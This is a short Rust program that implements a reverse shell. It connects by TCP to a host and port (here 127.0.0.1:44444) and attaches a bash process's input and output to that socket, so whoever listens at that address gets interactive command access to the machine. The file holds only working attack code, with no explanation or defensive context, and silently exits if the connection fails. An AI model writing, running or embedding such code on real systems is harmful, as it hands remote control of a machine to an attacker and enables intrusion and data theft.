use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio, exit};

fn main() {

    let ip: &str = "127.0.0.1";
    let port: i32 = 44444;

    match TcpStream::connect(format!("{}:{}", ip, port)) {
        Ok(mut conn) => {
            let fd = conn.as_raw_fd();

            Command::new("bash")
                .stdin(unsafe { Stdio::from_raw_fd(fd) })
                .stdout(unsafe { Stdio::from_raw_fd(fd) })
                .stderr(unsafe { Stdio::from_raw_fd(fd) })
                .spawn()
                .unwrap()
                .wait()
                .unwrap();

        },

        Err(_) => {
            exit(0);

        },

    }

}
